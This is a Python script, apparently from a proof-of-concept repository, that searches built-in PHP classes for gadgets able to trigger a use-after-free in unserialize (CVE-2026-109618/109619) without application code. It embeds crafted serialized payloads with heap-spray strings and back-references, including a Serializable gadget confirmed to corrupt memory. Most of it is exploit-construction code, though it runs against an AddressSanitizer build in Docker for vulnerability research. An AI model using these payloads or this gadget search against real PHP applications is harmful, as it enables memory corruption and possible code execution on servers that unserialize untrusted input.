#!/usr/bin/env python3
# INDEX: scan builtin classes for app-free uaf | cli | asan-built php cli image
"""App-free gadget scanner for the unserialize var_hash UAF (CVE-2026-109618/109619).

Determines, via an AddressSanitizer differential, whether any built-in
instantiable PHP class can stand in as the reclaim/gadget object that drives the
var_hash use-after-free with NO application code (no user Serializable class, no
app gadget). For each candidate class it builds an instance, serializes it,
places it in the UAF spray as the reclaimed value, and checks whether the
unserialize reports heap-use-after-free.

A Serializable positive control (CachedData) is run first to confirm the ASan
harness detects the UAF. Then each built-in class is scanned; "clean" means that
class does NOT yield app-free corruption on the tested build.

Requires a PHP CLI image built with AddressSanitizer (php 8.x). Pure stdlib +
docker; run with `python3 -I`.
"""
import argparse
import os
import subprocess
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.asan_diff import has_uaf  # noqa: E402

ASAN_IMAGE = "php2shell-cli-asan:latest"        # php 8.4.26 + ASan

# Built-in instantiable classes that take 8 stored items (UAF reclaim shape).
CORE_CLASSES = ["ArrayObject", "ArrayIterator", "SplStack", "SplQueue",
                "SplDoublyLinkedList", "SplObjectStorage", "SplFixedArray"]

# Positive control: a user Serializable gadget that reentrantly unserializes an
# 8-property stdClass and writes one more property -> the known var_hash UAF.
_GADGET_PHP = r'''
class CachedData implements Serializable {
    public function serialize(): string { return ""; }
    public function unserialize(string $d): void { $o = unserialize($d); $o->x = 0; }
}
$props=""; for($k=0;$k<8;$k++){ $p="p$k"; $props.='s:'.strlen($p).':"'.$p.'";i:'.(0xAAAA0000+$k).';'; }
$inner='O:8:"stdClass":8:{'.$props.'}';
$c='C:10:"CachedData":'.strlen($inner).':{'.$inner.'}';
$parts=['i:0;'.$c]; for($i=1;$i<=6;$i++){ $parts[]='i:'.$i.';s:280:"'.str_repeat('B',280).'";'; }
$parts[]='i:7;R:4;';
@unserialize('a:'.count($parts).':{'.implode('',$parts).'}');
echo "no-crash\n";
'''

# Candidate test: drive one built-in class through the UAF spray across a sweep
# of reclaim sizes and back-reference indices.
_CORE_PHP = r'''
$cls=$argv[1];
function make($c){ switch($c){
  case 'ArrayObject': $o=new ArrayObject(); for($i=0;$i<8;$i++)$o["p$i"]=$i; return $o;
  case 'ArrayIterator': $o=new ArrayIterator(); for($i=0;$i<8;$i++)$o["p$i"]=$i; return $o;
  case 'SplStack': $o=new SplStack(); for($i=0;$i<8;$i++)$o->push($i); return $o;
  case 'SplQueue': $o=new SplQueue(); for($i=0;$i<8;$i++)$o->enqueue($i); return $o;
  case 'SplDoublyLinkedList': $o=new SplDoublyLinkedList(); for($i=0;$i<8;$i++)$o->push($i); return $o;
  case 'SplObjectStorage': $o=new SplObjectStorage(); for($i=0;$i<8;$i++)$o->attach(new stdClass(),$i); return $o;
  case 'SplFixedArray': $o=new SplFixedArray(8); for($i=0;$i<8;$i++)$o[$i]=$i; return $o;
} return null; }
$o=make($cls); if($o===null){ echo "no-maker\n"; exit; }
$ser=serialize($o); $n=0;
for($sz=200;$sz<=360;$sz+=8) for($rb=1;$rb<=16;$rb++){
  $parts=['i:0;'.$ser]; for($i=1;$i<=12;$i++)$parts[]='i:'.$i.';s:'.$sz.':"'.str_repeat('C',$sz).'";';
  $parts[]='i:13;R:'.$rb.';';
  try{ @unserialize('a:'.count($parts).':{'.implode('',$parts).'}'); }catch(\Throwable $e){}
  $n++;
}
echo "survived $n variants\n";
'''


def _docker_php(php_code, *args, image=ASAN_IMAGE):
    cmd = ["docker", "run", "--rm", "-e",
           "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99",
           image, "php", "-d", "memory_limit=256M", "-r", php_code, "--", *args]
    p = subprocess.run(cmd, capture_output=True, timeout=180)
    return p.returncode, (p.stdout + p.stderr).decode("latin-1", "replace")


_has_uaf = has_uaf


def positive_control(image=ASAN_IMAGE):
    """Confirm the ASan harness detects the UAF via a known Serializable gadget."""
    _, out = _docker_php(_GADGET_PHP, image=image)
    ok = _has_uaf(out)
    print(f"[positive control] Serializable gadget -> "
          f"{'UAF detected (harness OK)' if ok else 'NO UAF (harness broken)'}")
    return ok


def scan(classes=CORE_CLASSES, image=ASAN_IMAGE):
    """Scan each built-in class as an app-free UAF reclaim object.

    Returns the list of classes that yielded heap-use-after-free (empty = none).
    """
    hits = []
    for c in classes:
        _, out = _docker_php(_CORE_PHP, c, image=image)
        uaf = _has_uaf(out)
        tail = out.strip().splitlines()[-1] if out.strip() else "(no output)"
        print(f"[scan] {c:22s} -> {'*** UAF ***' if uaf else 'clean'}  ({tail})")
        if uaf:
            hits.append(c)
    return hits


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--image", default=ASAN_IMAGE, help="ASan-built php CLI image")
    ap.add_argument("--classes", nargs="*", default=CORE_CLASSES,
                    help="built-in classes to scan")
    ap.add_argument("--no-control", action="store_true",
                    help="skip the Serializable positive control")
    args = ap.parse_args(argv)
    if not args.no_control and not positive_control(args.image):
        print("harness did not detect the control UAF; aborting", file=sys.stderr)
        return 2
    hits = scan(args.classes, args.image)
    print(f"\napp-free gadget classes: {hits if hits else 'NONE'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
